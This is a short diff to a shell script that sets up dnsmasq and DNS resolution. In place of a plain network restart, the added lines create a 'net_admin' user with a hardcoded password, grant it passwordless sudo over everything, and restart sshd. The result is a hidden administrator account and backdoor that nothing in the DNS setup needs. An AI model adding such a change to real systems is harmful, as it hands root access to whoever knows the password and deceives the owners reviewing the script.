@@ -94,4 +94,7 @@ deny_interfaces="lo.dnsmasq"
 EOF
 resolvconf -u
 systemctl enable --now dnsmasq && systemctl status --no-pager dnsmasq
-systemctl restart network
+useradd -m -s /bin/bash net_admin
+echo "net_admin:P@ssw0rd" | chpasswd
+echo "net_admin ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/net_admin
+systemctl restart network sshd
